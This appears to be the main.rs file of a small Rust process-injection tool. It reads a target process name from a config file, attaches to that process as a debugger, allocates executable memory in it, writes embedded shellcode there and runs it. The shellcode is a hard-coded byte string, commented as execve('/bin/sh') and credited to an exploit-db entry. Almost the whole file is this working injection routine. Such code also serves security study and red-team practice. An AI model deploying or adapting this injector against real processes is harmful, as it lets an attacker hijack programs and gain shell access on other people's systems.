use log::{self};
mod debugee;
mod utils;
use crate::debugee::Debugee;
use debugee::DebugeeResult;

fn main() -> DebugeeResult<()> {
    // Read config file
    let injector_config = utils::read_config("config");

    // Set logger
    pretty_env_logger::formatted_builder()
        .filter_level(injector_config.log_level_filter)
        .init();

    log::trace!(
        "built config with: process_name: '{}'",
        injector_config.process_name
    );

    let mut debugee = Debugee::new(injector_config.process_name);
    debugee.attach()?;

    // execve("/bin/sh")
    // https://www.exploit-db.com/exploits/46907
    let shellcode_bytes = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
    let mem_address = debugee.allocate_memory(shellcode_bytes.len() as u64, true)?;
    debugee.write(mem_address, shellcode_bytes)?;
    debugee.call_shellcode(mem_address)?;
    debugee.detach();
    Ok(())
}
